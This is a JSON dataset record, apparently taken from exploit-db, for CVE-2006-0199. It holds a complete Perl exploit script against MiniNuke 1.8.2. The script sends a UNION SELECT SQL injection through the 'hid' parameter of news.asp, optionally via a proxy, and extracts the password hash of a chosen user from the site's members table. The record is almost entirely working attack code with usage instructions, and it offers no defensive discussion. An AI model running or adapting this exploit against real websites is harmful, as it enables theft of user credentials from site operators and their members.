{
  "id": "1419",
  "title": "MiniNuke 1.8.2 - &#039;hid&#039; SQL Injection",
  "cve": "CVE-2006-0199",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n\r\n# MiniNuke (www.miniex.net) Version: <= 1.8.2  SQL-injection exploit.\r\n# This exploit uses the vulnerability discovered by nukedx@nukedx.com.\r\n# Exploit uses SQl-injection to give you the hash from user with chosen id.\r\n# DetMyl, 2006 Detmyl@bk.ru \r\n\r\nuse IO::Socket;\r\n\r\nif (@ARGV < 3)\r\n {\r\n print q(\r\n +++++++++++++++++++++++++++++++++++++++++++++++++++\r\n Usage: perl mini-nuke.pl [site] [dir] [useId] [proxy (optional)] \r\n i.e. perl mini-nuke.pl \"somesite.com\" / 52 127.0.0.1:3128\r\n ++++++++++++++++++++++++++++++++++++++++++++++++++++\r\n           );   \r\n exit;\r\n } \r\n$serv  = $ARGV[0];\r\n$dir   = $ARGV[1];\r\n$uid = $ARGV[2];\r\n$proxy   = $ARGV[3];\r\n\r\nprint \"----------------------------------\\n\";\r\nif ( defined $proxy) {\r\n\t$proxy =~ s/(http:\\/\\/)//eg;\r\n\t($proxyAddr,$proxyPort) = split(/:/, $proxy);\r\n   }\r\n$serv =~ s/(http:\\/\\/)//eg;\r\n$request =\"http://\".$serv.$dir.\"news.asp?Action=Print&hid=66%20union+select+0,sifre,0,0,0,0,0,0,0,0+from+members+where+uye_id=\".$uid;\r\nprint \"Connecting to: $serv...\\n\";\r\nprint $proxy?\"Using proxy: $proxy \\n\":\"\";\r\n$socket = IO::Socket::INET->new( Proto => \"tcp\",\r\n\t\t\t\t PeerAddr => $proxyAddr?\"$proxyAddr\":\"$serv\",\r\n\t\t\t\t PeerPort => $proxyPort?\"$proxyPort\":\"80\") \r\n\t\t\t\t || die \"can't connect to: $serv\\n\";\r\nprint $socket \"GET $request HTTP/1.1\\n\";\r\nprint $socket \"Host: $serv\\n\";\r\nprint $socket \"Accept: */*\\n\";\r\nprint $socket \"Connection: close\\n\\n\";\r\nprint \"+ Connected!...\\n\";\r\n\twhile($answer = <$socket>) {\r\n\t\tif ($answer =~ /<b>([\\d,a-f]{32})<\\/b>/) { \r\n\t\t\tprint \"+ Found! The hash for user $uid: $1\\n\";\r\n\t\t\tprint \"----------------------------------\\n\";\r\n\t\t\t  exit(); }\r\n\t\tif ($answer =~ /number of columns/) { print \"+ Vulnerable! But no result with default querry, so manually change the scrypt;-)...\\n\";exit(); }\r\n\t}\r\nprint \"Exploit failed\\n\";\r\nprint \"--------------------------\\n\";\r\n\r\n# milw0rm.com [2006-01-14]",
  "url": "https://www.exploit-db.com/exploits/1419"
}